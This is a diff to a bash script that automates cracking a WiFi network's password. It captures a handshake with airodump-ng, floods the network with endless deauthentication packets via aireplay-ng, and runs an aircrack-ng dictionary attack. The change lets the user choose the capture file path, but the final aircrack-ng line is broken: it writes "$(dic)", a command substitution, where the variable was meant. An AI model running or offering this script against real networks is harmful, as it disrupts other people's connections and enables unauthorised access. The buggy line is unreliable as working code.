@@ -13,6 +13,8 @@ blue='\e[34m'
 i=1
 clear
 
+
+
 com=$(iwconfig)
 echo "$com"
 
@@ -48,13 +50,18 @@ clear
 
 gnome-terminal --title="Airodump-ng search for network" -- bash -c "airodump-ng $ad; exec bash"
 
+
 echo -ne "${blue}Enter the MAC-ADDRESS of the network:${nc} "
 read bssid
 
 echo -ne "${blue}Enter the channel of the network:${nc} "
 read channel
 
-gnome-terminal --tab --title="Airodump-ng Output" -- bash -c "airodump-ng $ad -w /home/kali/Desktop/hack1 -c $channel --bssid $bssid; exec bash"
+echo -ne "${blue}Enter the place that will save the cap file + name of file (example = /home/kali/Desktop/hack1 :)(caution : change the name of the cap file when its use one time ago ) :${nc}"
+
+read dic
+
+gnome-terminal --tab --title="Airodump-ng Output" -- bash -c "airodump-ng $ad -w $dic -c $channel --bssid $bssid; exec bash"
 
 gnome-terminal --tab --title="attacking the network" -- bash -c "aireplay-ng --deauth 0 -a $bssid $ad"
 
@@ -69,7 +76,7 @@ read word
 
 sleep 5
 
-aircrack-ng "/home/kali/Desktop/hack1-01.cap"  -w  "$word"
-((i++))
+aircrack-ng "$(dic).cap"  -w  "$word"
+
 
 
